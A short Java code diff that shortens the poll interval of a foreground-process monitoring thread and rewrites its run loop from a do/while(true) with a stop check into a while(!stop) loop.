@@ -28,7 +28,7 @@ public class BroadcastMonitorProcess extends Thread {
 
 	public BroadcastMonitorProcess() {
 		stop = false;
-		period = 5000; // Poll interval
+		period = 2000; // Poll interval
 		runningProcess = new RunningProcesses();
 		
 		if (Cfg.DEBUG) {
@@ -38,11 +38,8 @@ public class BroadcastMonitorProcess extends Thread {
 
 	@Override
 	public void run() {
-		do {
-			if (stop) {
-				return;
-			}
-
+		while (!stop) {
+			
 			String foreDigest = runningProcess.getForeground();
 
 			if (!foreDigest.equals(oldForeDigest)) {
@@ -67,7 +64,7 @@ public class BroadcastMonitorProcess extends Thread {
 					Check.log(e);//$NON-NLS-1$
 				}
 			}
-		} while (true);
+		} ;
 	}
 
 	synchronized void register(ListenerProcess listenerProcess) {
